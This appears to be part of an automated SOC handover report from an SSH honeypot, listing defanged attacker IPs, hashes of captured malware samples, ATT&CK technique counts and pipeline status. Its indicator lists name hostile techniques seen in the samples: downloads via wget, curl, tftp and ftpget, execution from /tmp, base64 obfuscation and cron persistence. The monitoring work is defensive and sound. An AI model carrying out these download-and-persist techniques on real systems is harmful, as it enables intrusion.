| `194.88.98[.]89` | 1 | 2026-08-11 04:47 | 2026-08-11 04:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.78.100[.]163` | 1 | 2026-08-11 07:57 | 2026-08-11 07:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.250.26[.]54` | 1 | 2026-08-11 03:21 | 2026-08-11 03:21 | 30s | 0 | `T1592` | 🟢 LOW |
| `216.218.206[.]68` | 1 | 2026-08-11 05:02 | 2026-08-11 05:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.180.249[.]165` | 1 | 2026-08-11 01:52 | 2026-08-11 01:52 | 14s | 0 | `T1592` | 🟢 LOW |
| `220.180.249[.]165` | 1 | 2026-08-11 07:50 | 2026-08-11 07:50 | 12s | 0 | `T1592` | 🟢 LOW |
| `31.40.134[.]78` | 1 | 2026-08-11 01:46 | 2026-08-11 01:46 | 13s | 0 | `T1592` | 🟢 LOW |
| `34.78.185[.]249` | 1 | 2026-08-11 06:25 | 2026-08-11 06:25 | 7s | 0 | `T1592` | 🟢 LOW |
| `35.205.205[.]180` | 1 | 2026-08-11 06:26 | 2026-08-11 06:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.137.38[.]119` | 1 | 2026-08-11 06:08 | 2026-08-11 06:08 | 3s | 0 | `T1592` | 🟢 LOW |
| `38.172.184[.]129` | 1 | 2026-08-11 07:53 | 2026-08-11 07:54 | 10s | 0 | `T1592` | 🟢 LOW |
| `42.51.34[.]251` | 1 | 2026-08-11 06:25 | 2026-08-11 06:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-08-11 01:10 | 2026-08-11 01:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-08-11 04:06 | 2026-08-11 04:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]26` | 1 | 2026-08-11 02:28 | 2026-08-11 02:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-08-11 03:43 | 2026-08-11 03:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-08-11 06:38 | 2026-08-11 06:38 | 3s | 0 | `T1592` | 🟢 LOW |
| `45.79.5[.]11` | 1 | 2026-08-11 02:43 | 2026-08-11 02:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.227.26[.]50` | 1 | 2026-08-11 05:26 | 2026-08-11 05:27 | 14s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-08-11 07:14 | 2026-08-11 07:15 | 42s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]107` | 1 | 2026-08-11 03:08 | 2026-08-11 03:08 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]227` | 1 | 2026-08-11 03:28 | 2026-08-11 03:28 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]233` | 1 | 2026-08-11 04:38 | 2026-08-11 04:38 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]200` | 1 | 2026-08-11 01:02 | 2026-08-11 01:02 | 17s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]122` | 1 | 2026-08-11 04:48 | 2026-08-11 04:48 | 15s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]50` | 1 | 2026-08-11 00:14 | 2026-08-11 00:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]42` | 1 | 2026-08-11 04:52 | 2026-08-11 04:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]65` | 1 | 2026-08-11 06:37 | 2026-08-11 06:37 | 10s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]30` | 1 | 2026-08-11 00:57 | 2026-08-11 00:58 | 7s | 0 | `T1592` | 🟢 LOW |
| `74.82.47[.]4` | 1 | 2026-08-11 08:03 | 2026-08-11 08:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.236.211[.]54` | 1 | 2026-08-11 00:58 | 2026-08-11 01:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `84.54.70[.]7` | 1 | 2026-08-11 01:01 | 2026-08-11 01:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]130` | 1 | 2026-08-11 04:48 | 2026-08-11 04:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]11` | 1 | 2026-08-11 07:50 | 2026-08-11 07:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.210.248[.]194` | 1 | 2026-08-11 01:32 | 2026-08-11 01:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.213.187[.]20` | 1 | 2026-08-11 07:11 | 2026-08-11 07:11 | 14s | 0 | `T1592` | 🟢 LOW |
| `91.224.137[.]79` | 1 | 2026-08-11 08:39 | 2026-08-11 08:39 | 14s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-11 06:24 | 2026-08-11 06:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.92.47[.]140` | 1 | 2026-08-11 08:45 | 2026-08-11 08:45 | 8s | 0 | `T1592` | 🟢 LOW |
| `92.96.211[.]84` | 1 | 2026-08-11 00:06 | 2026-08-11 00:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]144` | 1 | 2026-08-11 00:26 | 2026-08-11 00:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.59.179[.]123` | 1 | 2026-08-11 00:05 | 2026-08-11 00:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.59.20[.]25` | 1 | 2026-08-11 00:06 | 2026-08-11 00:06 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/74** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 56/100 | 🟡 MEDIUM | **16/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `138.255.206[.]231` | BR | CIT INFORMATICA | **100** ⚠️ | 2 |
| `36.137.38[.]119` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `195.78.100[.]163` | UA | Ukrtranstelecom tc, ltd | **100** ⚠️ | 7 |
| `220.189.209[.]18` | CN | Zhongke Taineng Gaoming Science and Technology Development Co., Ltd. | **100** ⚠️ | 50 |
| `213.55.79[.]195` | ET | Ethio Telecom | **100** ⚠️ | 50 |
| `91.233.83[.]203` | GB | Andrew Millar Ltd | **100** ⚠️ | 10 |
| `66.132.195[.]35` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `218.23.95[.]14` | CN | CHINANET Anhui province network | **100** ⚠️ | 50 |
| `196.216.81[.]126` | UG | Liquid Telecommunications Operations Limited | **100** ⚠️ | 50 |
| `213.33.204[.]130` | RU | Interface networks - Msk. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 387 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 361 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 100 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 97 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 97 |

---

## 🔕 False Positive Summary (93 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 16 |
| AbuseIPDB score 11 below threshold 25 | 3 |
| AbuseIPDB score 13 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 5 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 4 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 56 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 1004 cases |
| Tool 34  | Credential Extractor        | ✅ 421 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 23 fingerprints |
| Tool 36  | Command Clustering          | ✅ 15 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 266 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 93 filtered (9.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 131 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 361 priority case(s) shown individually · 119 recon entry/entries in table (51 group(s) consolidating 482 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-11T10:54:49Z_
